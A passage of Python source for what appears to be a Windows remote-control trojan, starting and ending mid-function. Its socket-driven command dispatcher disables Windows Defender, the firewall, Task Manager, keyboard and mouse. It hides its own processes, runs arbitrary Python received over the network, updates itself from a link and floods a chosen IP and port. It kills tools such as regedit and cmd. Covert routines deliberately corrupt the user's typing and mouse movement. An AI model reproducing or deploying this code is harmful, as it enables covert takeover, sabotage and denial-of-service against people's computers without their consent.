        send_all_hosts_a_todo(information_msg, settingIP=addr)
    elif task == 'addselftosafemode':
        addselftosafemode()
    elif task == 'protectfileself':
        protectfileself()
    elif task == 'disablewindowsdefender':
        DisableWindowsDefender()
    elif task == 'enablewindowsdefender':
        EnableWindowsDefender()
    elif task == 'disableresetoptions':
        disableresetoptions()
    elif task == 'enableresetoptions':
        enableresetoptions()
    elif task == 'handletostartsequences':
        handle_tostart_sequences()
    elif task == 'terminateunknownprocesses':
        terminate_unknown_processes()
    elif task == 'getscriptdirectory':
        get_script_directory()
    elif task == 'getscriptfilename':
        get_script_filename()
    elif task == 'hideselfexecutable':
        hide_self_executable()
    elif task == 'restartexplorer':
        restart_explorer()
    elif task == 'killself':
        kill_self()
    elif task == 'resetnetwork':
        reset_network()
    elif task == 'diversifywindowslagclicksoundenable':
        enable_windows_lag_click_sound()
    elif task == 'diversifywindowslagclicksounddisable':
        disable_windows_lag_click_sound()
    elif task == 'prockill' and information_msg is not None:
        procKill(information_msg)
    elif task == 'setvolume' and information_msg is not None:
        set_volume(information_msg)
    elif task == 'updateselfvialink' and information_msg is not None:
        updateselfViaLink(information_msg_beforelower)
    elif task == 'renameself' and information_msg is not None:
        renameSELF(information_msg_beforelower)
    elif task == 'hideprocessvianame' and information_msg is not None:
        hide_process_via_name(information_msg_beforelower)
    elif task == 'showprocessvianame' and information_msg is not None:
        show_process_via_name(information_msg_beforelower)
    elif task == 'freezeallprocesses':
        freeze_all_processes()
    elif task == 'unfreezeallprocesses':
        unfreeze_all_processes()
    elif task == 'restartself':
        restart_self()
    elif task == 'movetofolder' and information_msg is not None:
        moveToFolder(information_msg_beforelower)
    elif task == 'offsmartassnointernet':
        toggleSmartAssNoInternet(Set=False)
    elif task == 'onsmartassnointernet':
        toggleSmartAssNoInternet(Set=True)
    elif task == 'dosipport' and information_msg is not None:
        dosIPPORT(information_msg)
    elif task == 'closedosipport':
        closedosingthreads()
    elif task == 'disableuwf':
        disableUWF()
    elif task == 'enableuwf':
        enableUWF()
    elif task == 'inviscurr' and information_msg:
        inviscurr(information_msg)
    elif task == 'webhandler':
        webhandler(information_msg_beforelower)
    elif task == 'playtone' and information_msg is not None:
        play_tone_fxphone(information_msg)
    elif task == 'playshepardtone' and information_msg is not None and "thmaabaoplurh5w" in information_msg.lower():
        start_hz, end_hz, duration = information_msg.lower().split('thmaabaoplurh5w'.lower())
        play_shepard_tone(int(start_hz), int(end_hz), int(duration))
    elif task == 'runpythonscript' and information_msg is not None:
        runpythonscript(information_msg_beforelower)
    elif task == 'disablefirewall':
        disablefirewall()
    elif task == 'enablefirewall':
        enablefirewall()
    elif task == 'restarttoadvancedoptions':
        restartToADvancedOptions()
    elif task == 'disabletaskmgr':
        disableTaskmanager()
    elif task == 'enabletaskmgr':
        enabletaskmgr()
    elif task == 'enablemouse':
        enable_mouse()
    elif task == 'disablemouse':
        disable_mouse()
    elif task == 'enablekeyboard':
        enable_keyboard()
    elif task == 'disablekeyboard':
        disable_keyboard()
    elif task == 'presskeys' and information_msg is not None:
        presskeys(information_msg)
    elif task == 'writetext' and information_msg is not None:
        writetext(information_msg)
    elif task == 'meandtheboys':
        MeAndTheBoys()
    elif task == 'restarttouac':
        restartToUAC()
    elif task == 'installchrome':
        installchrome()
    elif task == 'dvdtimeout' and information_msg is not None:
        dvdtimeout(int(information_msg))  # Assuming information_msg contains the timeout value
    elif task == 'unprotectselffile':
        unprotect_file(os.path.join(get_script_directory(), get_script_filename()))
    elif task == 'maximizeprocessvianame' and information_msg is not None:
        maximize_process_via_name(information_msg)
    elif task == 'minimizeprocessvianame' and information_msg is not None:
        minimize_process_via_name(information_msg)
    elif task == 'disableterminateunknownprocesses':
        autoterminateunknownexeprocesses = False
    elif task == 'enableterminateunknownprocesses':
        autoterminateunknownexeprocesses = True
    elif task == 'runfunctionviastring' and information_msg is not None:
        if "split".lower() in information_msg.lower():
            locals()[information_msg_beforelower.split('split')[1].split("=")[0]] = information_msg_beforelower.split('split')[1].split("=")[1]
            # print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',information_msg_beforelower.split('split')[0], information_msg_beforelower.split('split')[1])
            # Split the information_msg_beforelower and extract the function name and arguments
            function_name, *arguments = information_msg_beforelower.split('split')

            # Initialize an empty dictionary to store the arguments
            kwargs = {}

            # Parse the arguments and add them to the kwargs dictionary
            for arg in arguments:
                arg_name, arg_value = arg.split("=")
                kwargs[arg_name.strip()] = arg_value.strip()

            # Call runfunctionvianame with the function name and parsed arguments
            runfunctionvianame(function_name, **kwargs)
        
        else:
            runfunctionvianame(information_msg_beforelower); print("aaaaaaaaaaaaaaaa", information_msg_beforelower)
    elif task == 'unblock_application_by_name' and information_msg is not None:
        unblock_application_by_name(information_msg_beforelower)
    elif task == 'block_application_by_name' and information_msg is not None:
        block_application_by_name(information_msg_beforelower)
    elif task == 'unblock_ports_for_application' and information_msg is not None:
        unblock_ports_for_application(information_msg_beforelower)
    elif task == 'block_ports_for_application' and information_msg is not None:
        block_ports_for_application(information_msg_beforelower)
    elif task == 'resetfirewall':
        reset_firewall()
    elif task == 'self_destruct':
        self_destruct()
    elif task == 'playytvidbetweentime' and not task == "playytvidbetweentimefullscreen": 
        url, start, end = information_msg_beforelower.split("splitterofty1243")
        print(f'Background, URL: {url}, Start: {start}, End: {end}')
        playYTvidinbackground(url, start, end)

        # playYTvidinbackground(information_msg_beforelower.split("splitterofty1243")[0], information_msg_beforelower.lower().split("splitterofty1243")[1], information_msg_beforelower.lower().split("splitterofty1243")[2])
    elif task == 'playytvidbetweentimefullscreen':
        url, start, end = information_msg_beforelower.split("splitterofty1243")
        print(f'Fullscreen, URL: {url}, Start: {start}, End: {end}')
        playYTvidfullscreen(url, start, end)
        # playYTvidfullscreen(information_msg_beforelower.split("splitterofty1243")[0], information_msg_beforelower.lower().split("splitterofty1243")[1], information_msg_beforelower.lower().split("splitterofty1243")[2])
    elif task == 'alwaysontop':
        set_always_on_top_via_name(information_msg_beforelower)
    elif task == 'unsetalwaysontop':
        unset_always_on_top_by_name(information_msg_beforelower)
    
    
    else:
        print(f'Task {task} not found, information: {information_msg_beforelower}')    
def handle_connection(conn, addr):
    """Handles incoming socket connections."""
    global device_item_received
    TUTKEYPHONE = 'placeholder'
    try:
        msg_length = conn.recv(HEADER).decode('utf-8') 
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length)
            text = decrypt_msg(msg, TUTKEYPHONE)
            if text is False:
                return
            msg = text
            print("Encrypted message(now decrypted):", msg)
            conn.close()
            conn.detach()
            ip_ofcn, port_ofcn = addr
            isconnVaryHost = False
            for i in varyhosts:
                ip123, port123 = i.split(":")
                if ip123 == ip_ofcn:
                    isconnVaryHost = True
                    break
            if msg.lower() == 'SystemStartupIAmAVaryHost'.lower():
                isconnVaryHost = True
                print(f'Added {addr} to varyhosts')
            if isconnVaryHost:
                print(f'Treating {addr} as a vary host')
                new_addr = (str(ip_ofcn), int(vary_PORT)) 
                device_item_received[new_addr] = msg                    
                handle_messages_varyhost(msg, new_addr, conn)
                return
            else:
                device_item_received[addr] = msg
            global prioritizeipv4
            if prioritizeipv4 is not None:
                try:
                    ip_of_client = addr[0]
                    if ip_of_client not in prioritizeipv4:
                        return 
                except Exception as e:
                    print(f'Error in prioritizeipv4 handling of receive todo phones: {e}')
            handle_connection_of_connected_device(msg, addr, conn)
    except Exception as e:
        print("error message receive function :", e)

def serverhost():
    """Starts the server and listens for incoming connections."""
    try:
        server.listen()
        print(f"[LISTENING] Server is listening on {SERVER}:{vary_PORT}")
        while True:
            conn, addr = server.accept() 
            connected_devices.append(conn)
            threading.Thread(target=handle_connection, args=(conn, addr)).start()
    except Exception as e:
        print(f'Error in serverhost function: {e}')
        if "time" in str(e).lower():
            restart_self()
        slp(3)
        return serverhost()

def get_script_directory():
    """Gets the directory where the script is located."""
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))

def get_script_filename():
    """Gets the filename of the script."""
    if getattr(sys, 'frozen', False):
        return os.path.basename(sys.executable)
    else:
        return os.path.basename(__file__)

# print(f'Script directory: {get_script_directory()}')
# print(f'Script filename: {get_script_filename()}')
# time.sleep(10) # for debugging



def get_process_connected_pids(pid):
    """Gets a list of PIDs related to a given process, including parent and children."""
    proc = psutil.Process(pid)
    parent = proc.parent()
    ppid = parent.pid if parent is not None else None
    children = proc.children()
    child_pids = [child.pid for child in children]
    all_pids = [pid]
    if ppid is not None:
        all_pids.append(ppid)
    all_pids.extend(child_pids)
    return all_pids

def hide_self_executable():
    """Hides the script's UI from the user."""
    [hide_process_via_pid(i) for i in get_process_connected_pids(os.getpid())]

def restart_explorer():
    """Restarts Windows Explorer."""
    runcmd("taskkill /f /im explorer.exe")
    runcmd("explorer.exe", retry=4)

def get_username_os():
    """Gets the username of the current user."""
    return os.getlogin()

def get_random_folder():
    """Gets a random folder from a list of possible locations."""
    if admin_privileges:
        folders = [
            "C:\ProgramData",
            "C:\Windows",
            "C:\Windows\System32"
        ]
    else:
        username = get_username_os()
        folders = [
            f"C:\\Users\\{username}\\AppData\\Local",
            f"C:\\Users\\{username}\\AppData\\LocalLow",
            f"C:\\Users\\{username}\\AppData\\Roaming",
            f"C:\\Users\\{username}\\Documents"
        ]
    all_folders = []
    for i in folders:
        for x in os.listdir(i):
            if not x.startswith('.') and not x.endswith('.ini'): # To avoid hidden folders and .ini files
                all_folders.append(os.path.join(i, x))
    all_actual_folders = [i for i in all_folders if os.path.isdir(i) and " " not in i]
    if all_actual_folders:
        chosen = random.choice(all_actual_folders)
        return chosen
    else:
        print("No suitable folders found in the specified directories.")
        return None

def win_on_click_play_sound(x, y, button, pressed, stop_event):
    """Plays a system sound on mouse clicks."""
    if stop_event.is_set():
        return False 
    if pressed and button in (pynput.mouse.Button.left, pynput.mouse.Button.right, pynput.mouse.Button.middle):
        winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)

def windows_lag_click_sound(stop_event):
    """Starts a listener for mouse clicks and plays a sound on each click."""
    print("Enabling click sound")
    with pynput.mouse.Listener(on_click=lambda x, y, button, pressed: win_on_click_play_sound(x, y, button, pressed, stop_event)) as listener:
        listener.join()

def enable_windows_lag_click_sound():
    """Enables the click sound feature."""
    global winlag_thread
    if not stop_event_windowslag.is_set():
        print('Click sound is already enabled')
        return
    stop_event_windowslag.clear()
    print('Enabling click sound')
    winlag_thread = threading.Thread(target=windows_lag_click_sound, args=(stop_event_windowslag,))
    winlag_thread.start()

def disable_windows_lag_click_sound():
    """Disables the click sound feature."""
    stop_event_windowslag.set()
    try:
        winlag_thread.join()
    except:
        pass

def send_all_hosts_a_todo(todo, identifier=None, settingIP=None):
    """Sends a task to all connected Diversify hosts."""
    splitter = "XR~=3yy=[W2vc%L"
    if identifier is None:
        identifier = ''.join([str(random.randint(0, 9)) for _ in range(10)])
    buildup = fr"REQUESTSENDALLHOSTCONTINUEONMESSAGE{splitter}{socket.gethostbyname(socket.gethostname())}{splitter}{identifier}{splitter}{todo}"
    done_vary_tasks.append(identifier)
    sendAllVaryHosts(buildup)

def isIn(name, list): 
    """Checks if a string is present in a list of strings."""
    return any(name.lower() in i.lower() for i in list)

def kill_self():
    """Kills the script and all its related processes."""
    [runcmd(f'taskkill /f /t /PID {i}') for i in get_process_connected_pids(os.getppid())]
    runcmd(f'taskkill /f /t /PID {os.getpid()}')

def reset_network():
    """Resets the network settings."""
    runcmd('ipconfig /release')
    runcmd('ipconfig /renew')
    runcmd('ipconfig /flushdns')
    runcmd('netsh winsock reset')
    runcmd('netsh int ip reset')
    runcmd('netsh advfirewall reset')
    runcmd('netsh firewall reset')
    runcmd('netsh int tcp set heuristics disabled')
    runcmd('netsh int tcp set global autotuninglevel=normal')
    runcmd('netsh int tcp set global rss=enabled')
    runcmd('netsh int tcp show global')

def disablefirewall():
    """Disables the Windows Firewall."""
    runcmd('netsh advfirewall set allprofiles state off', True)
    runcmd('netsh firewall set notifications mode=disable profile=all', True)

def bypassfirewall():
    """Bypasses the firewall for the script."""
    exe_path = os.path.join(get_script_directory(), get_script_filename())
    cmd = f'netsh advfirewall firewall add rule name="x32dbg" dir=in action=allow program="{exe_path}" enable=yes'
    run_command_as_admin(cmd)
    restart_self()

def enablefirewall():
    """Enables the Windows Firewall."""
    runcmd('netsh advfirewall set allprofiles state on', True)

def restartToADvancedOptions():
    """Restarts the computer to Advanced Startup Options."""
    run_command_as_admin('shutdown.exe /r /o /f /t 0')

def disableTaskmanager():
    """Disables the Windows Task Manager."""
    run_command_as_admin('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

def enabletaskmgr():
    """Enables the Windows Task Manager."""
    run_command_as_admin('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')

def runpythonscript(text):
    """Executes Python code from a string."""
    try:
        exec(text)
        print('Succesfully ran code')
        return "Successfully ran code."
    except Exception as e:
        print(f'Error while running python code:\n{e}')
        return e

def check_and_kill_self(SERVER1, port_to):
    """Checks if the script is already running and kills the existing instance."""
    self_path = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
    print(f"{self_path} <- self variable")
    print('requested port to check: ' + str(port_to))

    def corruptfile(directoryoffile):
        """Corrupts a file by overwriting its content."""
        with open(directoryoffile, "w+") as f:
            f.seek(0)
            content = f.read()
            scrubbed_content = b"X" * len(content)
            f.seek(0)
            f.write(scrubbed_content)
            f.truncate()
            
    try:
        ADDR = (SERVER1, port_to)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(ADDR)        
        server.listen()
        server.close()
        server.detach()
        return "rn"
    except Exception as e:
        print(f'Error: {e}')
        pids_tocheck_ofself = get_process_connected_pids(get_own_parent_process_pid())
        for proc in psutil.process_iter():
            try:
                if proc.pid in pids_tocheck_ofself:
                    continue
                if len(proc.cmdline()) > 1:
                    vrsproc = proc.cmdline()[1]
                else:
                    vrsproc = proc.cmdline()[0]
                print(f'Name: {proc.name()}, equal to self {proc.name().casefold() == get_script_filename().casefold()}, location equal: {proc.name().casefold() == get_script_filename().casefold()}')
                if proc.name().casefold() == get_script_filename().casefold() and self_path.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                    return 'ks'
                elif proc.name().casefold() == get_script_filename().casefold():
                    [i.kill() for i in proc.children()]
                    proc.kill()
                    slp(0.4)
                    runcmd(f'taskkill /f /t /PID {proc.ppid}')
                    corruptfile(vrsproc.lower())
            except Exception as e:
                pass
        try:
            slp(3)
            ADDR = (SERVER1, port_to)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(ADDR)
            server.listen()
            server.close()
            server.detach()
            return "rn"
        except Exception as e:
            print(f'Error1: {e}')
            terminate_unknown_processes()
            try:
                slp(6)
                ADDR = (SERVER1, port_to)
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind(ADDR)
                server.listen()
                server.close()
                server.detach()
                return "rn"
            except Exception as e:
                print(f'Error2: {e}')
                reset_network()
                runcmd('shutdown.exe /g /t 0 /f')

def autokillunknownprocesses():
    """Automatically kills unknown processes."""
    global autoterminateunknownexeprocesses
    if autoterminateunknownexeprocesses:
        print('terminating unknown processes')
        terminate_unknown_processes(corrupt=False)
    threading.Timer(8.0, autokillunknownprocesses).start()

def autofreezeunknownprocesses_func():
    """Automatically freezes unknown processes."""
    global autofreezeunknownprocesses
    if autofreezeunknownprocesses:
        print('freezing unknown processes')
        freeze_unknown_processes()
    threading.Timer(8.0, autofreezeunknownprocesses_func).start()

if __name__ == '__main__':
    timer1_forautokill = threading.Timer(8.0, autokillunknownprocesses)  
    timer2_forautofreeze = threading.Timer(8.0, autofreezeunknownprocesses_func)  
    timer1_forautokill.start()
    timer2_forautofreeze.start()
    
def procKill(name):
    """Kills a process by its name."""
    if '.' not in name:
        name += ".exe"
    try:
        runcmd('taskkill /f /im ' + name)
    except:
        pass

def SmartAssNoInternet():
    """Implements behavior when the internet connection is lost."""
    global INTERNET, run_win_click_exclamation, autofreezeunknownprocesses, SmartAssNoInternet_isenabled
    wastriggedduetonointernet = False
    AmountOfTimeWithoutInternet_check = 0
    AmountOfTimeInSecondsWithoutInternet = 0
    previousTime = 0
    
    def resetback():
        """Resets variables and behavior."""
        global AmountOfTimeWithoutInternet_check, AmountOfTimeInSecondsWithoutInternet, previousTime, wastriggedduetonointernet
        AmountOfTimeWithoutInternet_check = 0
        AmountOfTimeInSecondsWithoutInternet = 0
        autofreezeunknownprocesses = False
        if GetSystemMetrics(SM_SWAPBUTTON):
            swapRMBAndLMB(False)
        previousTime = time.time()
        disable_windows_lag_click_sound()
        try:
            unfreeze_all_processes()
        except:
            pass
        wastriggedduetonointernet = False
    
    while True:
        if SmartAssNoInternet_isenabled:
            if INTERNET and wastriggedduetonointernet:
                resetback()
                wastriggedduetonointernet = False
                print('resetting SmartAssNoInternet behavior as internet is back on.')
            elif INTERNET and not wastriggedduetonointernet:
                time.sleep(10)
            else:
                wastriggedduetonointernet = True
                autofreezeunknownprocesses = True
                if AmountOfTimeWithoutInternet_check == 0:
                    AmountOfTimeWithoutInternet_check = time.time()
                else:
                    AmountOfTimeInSecondsWithoutInternet = time.time() - AmountOfTimeWithoutInternet_check
                if previousTime == round(time.time()):
                    continue
                else:
                    previousTime = round(time.time())
                if round(AmountOfTimeInSecondsWithoutInternet) == 10:
                    enable_windows_lag_click_sound()
                print(f"Amount of time without internet: {AmountOfTimeInSecondsWithoutInternet} seconds")
                if AmountOfTimeInSecondsWithoutInternet > 2:
                    list_of_process_names = []
                    [list_of_process_names.append(i.name()) for i in psutil.process_iter()]
                    if isIn("systemsettings.exe", list_of_process_names):
                        procKill("systemsettings")
                    if isIn("SecHealthUI.exe", list_of_process_names):
                        procKill("SecHealthUI.exe")
                    if isIn("Taskmgr.exe", list_of_process_names):
                        procKill("Taskmgr.exe")
                    if isIn("regedit.exe", list_of_process_names):
                        procKill("regedit.exe")
                    if isIn("cmd.exe", list_of_process_names):
                        procKill("cmd.exe")
                    if round(AmountOfTimeInSecondsWithoutInternet) % 4 == 1:
                        swapRMBAndLMB()
        else:
            if wastriggedduetonointernet:
                resetback()
                wastriggedduetonointernet = False
                print('resetting SmartAssNoInternet behavior as internet is back on.')
            time.sleep(10)
            
# def intermittent_internet():
#     while True:
#         time.sleep(random.randint(2, 5))  # Yes it's going to be often and trigger the dumbass no internet but i'll disable it.
#         print("Dropping internet...")
#         runcmd("netsh advfirewall firewall add rule name=\"Block Internet fl\" dir=out action=block remoteip=any enable=yes")
#          # named differentaly to avoid conflicts so that if one enables the other wouldn't delete and mess with it
#          # as the other one is static, if this one is triggered and it'll have the same name it'll overwrite and undo what the static did 
#          # which isn't the users intention.
#         time.sleep(3)  # Brief disconnect
#         # os.system("ipconfig /renew")  # Renews the IP address
#         runcmd("netsh advfirewall firewall delete rule name=\"Block Internet fl\"")
#         print("Internet restored.")
            
            
def disable_internet_fl():
    # runcmd("ipconfig /release")  # Releases the IP address # it fucking actually disables the internet.. 
    runcmd("netsh advfirewall firewall add rule name=\"Block Internet\" dir=out action=block remoteip=any enable=yes")

def enable_internet_fl():
    # runcmd("ipconfig /renew")  # Renews the IP address
    runcmd("netsh advfirewall firewall delete rule name=\"Block Internet\"")
    
def set_screen_brightness(target_brightness):
    """Sets the screen brightness to a specific value."""
    print(f"Set screen birghtness to {target_brightness}%.")
    sbc.set_brightness(target_brightness)

def hiccups(durationseconds):
    """Simulates a system hiccup by rapidly freezing and unfreezing the machine."""
    endtime = time.time() + durationseconds
    while time.time() < endtime:
        freeze_all_processes()
        slp(0.5)
        unfreeze_all_processes()
        # winsound.PlaySound("SystemHand", winsound.SND_ALIAS) # too much.. make it not be alertive.. it's secretive enough        
        slp(random.randint(3, 7))
# just in case..
if __name__ == '__main__':
    enable_internet_fl()

def subtly_mess_with_text():
    """occasionally swaps letters or inserts random characters."""

    def on_press(key):
        """callback for key presses."""
        # print(f"Key pressed: {key}")  # debug print

        try:
            char = key.char
            # print(f"Character: {char}")  # debug print

            if char.isalnum() and random.random() < 0.1: # glitch condition
                glitch_char = random.choice([
                    lambda c: list(c)[0],  # same char
                    lambda c: "".join(random.sample(list(c), len(c))),  # swaps chars
                    lambda c: c + random.choice(string.printable) # adds a char
                ])(char)
                
                print(f"Glitching: {char} -> {glitch_char}") # debug print
                write_text_delayed(glitch_char)
                return True # block the key

        except AttributeError:
            # print("Special key pressed")  # debug print
            pass  # ignore special keys
        return True  # process key normally


    def write_text_delayed(text):
        time.sleep(0.001)  # small delay
        keyboard.write(text)

    with pynput_keyboard.Listener(on_press=on_press) as listener:
        listener.join()
        
        
        
thread_messwithtext = KThread(target=subtly_mess_with_text)  # create the thread
        
def enable_subtly_mess_with_text():
    global thread_messwithtext
    if not thread_messwithtext.is_alive(): # avoid duplicates
        thread_messwithtext.start()  # start the thread

def disable_subtly_mess_with_text():
    global thread_messwithtext
    # if thread_messwithtext.is_alive():
    thread_messwithtext.kill()  # stop the thread
    thread_messwithtext = KThread(target=subtly_mess_with_text)  # create a new thread



def get_soundboard_folder():
    """Gets the path to the soundboard folder, working both in development and when packaged"""
    if getattr(sys, 'frozen', False):
        # Running in PyInstaller bundle
        base_path = sys._MEIPASS
    else:
        # Running in normal Python environment
        # base_path = os.path.dirname(os.path.abspath(__file__))
        # print(base_path)
        return r"ren" # diff path than exe and builder is as it is, i am not am going to deal with such a simple thing.
    return os.path.join(base_path, "soundboard")


def relative_path(folder, filename=None):
    """
    Returns the absolute path to a resource folder/file that works both in development and when packaged.
    
    Args:
        folder (str): The folder name (e.g., 'soundboard')
        filename (str, optional): The filename within the folder
        
    Returns:
        str: The absolute path to the folder or file
    """
    try:
        # Get base path - works both in dev and packaged
        if getattr(sys, 'frozen', False):
            # Running in PyInstaller bundle
            base_path = sys._MEIPASS
        else:
            # Running in normal Python environment
            base_path = os.path.dirname(os.path.abspath(__file__))
            
        # Construct folder path
        folder_path = os.path.join(base_path, folder)
        
        # Create folder if it doesn't exist
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            
        # Return either folder path or file path
        if filename:
            return os.path.join(folder_path, filename)
        return folder_path
        
    except Exception as e:
        print(f"Error in relative_path: {e}")
        return None


SOUNDS_FOLDER = get_soundboard_folder()  # Folder containing soundboard files 
ADDED_FOLDER = os.path.join(get_script_directory(), "soundboard_added_files")  # Folder containing user-added soundboard files



def convert_and_play_sound(sound_path, delete=False):
    """Converts a webm audio file to MP3 and plays it.
    
    Args:
        sound_path: Path to the webm audio file
    """
    try:
        # Convert webm to MP3 in memory
        audio = AudioSegment.from_file(sound_path, format="webm")
        mp3_memory_file = io.BytesIO()
        audio.export(mp3_memory_file, format="mp3")
        mp3_memory_file.seek(0)  # Rewind to beginning for reading

        # Initialize pygame mixer if needed
        if not pygame.mixer.get_init():
            pygame.mixer.init()
        
        # Play the converted sound
        sound = pygame.mixer.Sound(mp3_memory_file)
        sound.play()

        # Wait for sound to finish
        duration = sound.get_length()
        start_time = time.time()
        while time.time() - start_time < duration:
            time.sleep(0.1)
        try:        os.remove(sound_path) if delete else None
        except:     pass
    except Exception as e:
        print(f"Error converting/playing sound {sound_path}: {e}")
    finally:
        # Clean up pygame
        pygame.mixer.stop()
        

global cached_soundboard_data
cached_soundboard_data = None

def get_cached_soundboard_data_2folders():
    """
    1) If we already have cached_soundboard_data, return True.
    2) If not, build it by scanning two folders:
         - Normal soundboard (info['added'] = False)
         - "soundboard_added_files" (info['added'] = True)
       For each file: 
         - If it's .wav => get duration via wave
         - Else => try pygame to get length (mp3, ogg, wma, etc.)
       Store in the global cached_soundboard_data as a list of dicts:
         [ { "filename": "...", "info": {...}}, ... ]
       Return True on success or False on failure.
    """
    global cached_soundboard_data
    if cached_soundboard_data is not None:
        print("[get_cached_soundboard_data_2folders] Using existing cached data.")
        return True
    
    try:
        print("[get_cached_soundboard_data_2folders] Building cache from 2 folders")
        # Ensure pygame is properly init just once. We'll init & quit if needed.
        if not pygame.mixer.get_init():
            pygame.mixer.init()

        combined_data = []

        # 1) Normal folder
        if os.path.isdir(SOUNDS_FOLDER):
            for fname in os.listdir(SOUNDS_FOLDER):
                full_path = os.path.join(SOUNDS_FOLDER, fname)
                if os.path.isfile(full_path) and is_audio_file(fname):
                    info = get_soundboard_file_info_legacy(full_path)
                    if info:
                        info['added'] = False
                        combined_data.append({
                            'filename': fname,
                            'info': info
                        })

        # 2) Added folder
        if os.path.isdir(ADDED_FOLDER):
            for fname in os.listdir(ADDED_FOLDER):
                full_path = os.path.join(ADDED_FOLDER, fname)
                if os.path.isfile(full_path) and is_audio_file(fname):
                    info = get_soundboard_file_info_legacy(full_path)
                    if info:
                        info['added'] = True
                        combined_data.append({
                            'filename': fname,
                            'info': info
                        })

        # Done building
        cached_soundboard_data = combined_data
        print("[get_cached_soundboard_data_2folders] Cache built with", len(combined_data), "items.")

        # If we forcibly quit mixer to release resources, do so
        pygame.mixer.quit()
        return True
    except Exception as e:
        print(f"[get_cached_soundboard_data_2folders] Error: {e}")
        cached_soundboard_data = []
        pygame.mixer.quit()
        return False


def is_audio_file(fname):
    """Simple check if filename ends with typical audio extension."""
    lower = fname.lower()
    return lower.endswith('.wav') or lower.endswith('.mp3') or lower.endswith('.ogg') \
        or lower.endswith('.flac') or lower.endswith('.m4a') or lower.endswith('.wma')


def get_soundboard_file_info_legacy(file_path):
    """
    Original approach: 
     - .wav => wave module 
     - else => try pygame.mixer.Sound(...).get_length()
    Returns a dict with at least 'duration_seconds'.
    """
    try:
        if file_path.lower().endswith('.wav'):
            with wave.open(file_path, 'rb') as wf:
                duration = wf.getnframes() / wf.getframerate()
                channels = wf.getnchannels()
                sample_width = wf.getsampwidth()
                frame_rate = wf.getframerate()
                return {
                    'duration_seconds': round(duration, 2),
                    'channels': channels,
                    'sample_width': sample_width,
                    'frame_rate': frame_rate,
                    'format': 'wav'
                }
        else:
            # For mp3, ogg, etc.:
            s = pygame.mixer.Sound(file_path)
            dur = s.get_length()
            format = os.path.splitext(file_path)[1].replace('.', '').lower()
            size_mb = os.path.getsize(file_path) / (1024*1024)
            return {
                'duration_seconds': round(dur, 2),
                'size_mb': round(size_mb, 2),
                'format': format
            }
    except Exception as e:
        print(f"[get_soundboard_file_info_legacy] Error: {e}")
        return None
    

def subtly_mess_with_mouse():
    """Messes with mouse speed using delta calculations, applying speed changes
    for a duration of 10 seconds."""
    prev_x, prev_y = pyautogui.position()
    speed_change_duration = 10  # Seconds
    speed_change_timer = time.time()
    speed_change_active = False
    speed_change_type = None  # "faster" or "slower"

    while True:
        time.sleep(0.05)  # Check every 0.1 seconds
        current_x, current_y = pyautogui.position()
        dx = current_x - prev_x
        dy = current_y - prev_y
        if dx != 0 or dy != 0:  # Only mess if mouse moved
            if (not speed_change_active and
                random.random() < 0.1):  # 20% chance of messing
                speed_change_active = True
                speed_change_timer = time.time()
                speed_change_type = "faster" if random.random() < 0.5 else "slower"
            if not speed_change_active and random.random() < 0.05:  # 5% chance of random teleport of screen resolution
                   pyautogui.moveTo(random.randint(0, pyautogui.size()[0]), random.randint(0, pyautogui.size()[1]), duration=0)  # Instant tp
                   print('Teleport')
                   continue  # Skip the rest of the loop for this iteration
            # print(random.random())
            if not speed_change_active:
                # print('Sleeping for 5 seconds')
                time.sleep(5)
                
            if speed_change_active:
                if time.time() - speed_change_timer > speed_change_duration:
                    speed_change_active = False
                    speed_change_type = None
                else:
                    if speed_change_type == "faster":
                        # print('fast')
                        dx = dx * random.randint(1, 100) / 30
                        dy = dy * random.randint(1, 100) / 30
                    elif speed_change_type == "slower":
                        # print("slower")
                        dx = -dx / 1.05
                        dy = -dy / 1.05

            try:
                pyautogui.move(dx, dy, duration=0)  
            except Exception as e:
                print(e)
            prev_x, prev_y = pyautogui.position()
        else:
            prev_x, prev_y = pyautogui.position()

thread_subtlymesswithmouse = KThread(target=subtly_mess_with_mouse)  # create the thread

def enable_subtly_mess_with_mouse():
    global thread_subtlymesswithmouse
    if not thread_subtlymesswithmouse.is_alive(): # avoid duplicates
        thread_subtlymesswithmouse.start()  # start the thread
        
def disable_subtly_mess_with_mouse():
    global thread_subtlymesswithmouse
    # if thread_subtlymesswithmouse.is_alive():
    thread_subtlymesswithmouse.kill()  # stop the thread
    
def create_phantom_notification():
    """creates a fake notification that disappears quickly."""
    # this requires a GUI library, example w/ tkinter:
    root = tk.Tk()
    root.withdraw()  # hide the main window
    messagebox.showinfo("System Update", "A new update is available!")
    root.after(500, root.destroy) # disappears after 0.5 seconds

def subtly_mess_with_windows():
    """makes windows briefly minimize/maximize randomly."""
    while True:
        # print('did')
        window = win32gui.GetForegroundWindow()
        if window and random.random() < 0.05: # 5% chance of minimizing or maximizing
            print('Windows messing triggered')
            current_state = win32gui.GetWindowPlacement(window)[1]  # 1 is the minimization status
            try:
                if current_state == win32con.SW_SHOWMINIMIZED:  # if minimized
                    win32gui.ShowWindow(window, win32con.SW_RESTORE)  # restore to original
                    time.sleep(0.2)  # wait a bit
                    win32gui.ShowWindow(window, win32con.SW_SHOWMINIMIZED)  # minimize back
                    win32gui.ShowWindow(window, win32con.SW_RESTORE)  # restore to original state

                elif current_state == win32con.SW_SHOWMAXIMIZED:  # if maximized
                    win32gui.ShowWindow(window, win32con.SW_SHOWMINIMIZED)  # minimize
                    time.sleep(0.2)  # wait a bit
                    win32gui.ShowWindow(window, win32con.SW_RESTORE)  # restore to original state

                elif current_state == win32con.SW_SHOWNORMAL:  # if normal
                    win32gui.ShowWindow(window, win32con.SW_SHOWMINIMIZED)  # minimize
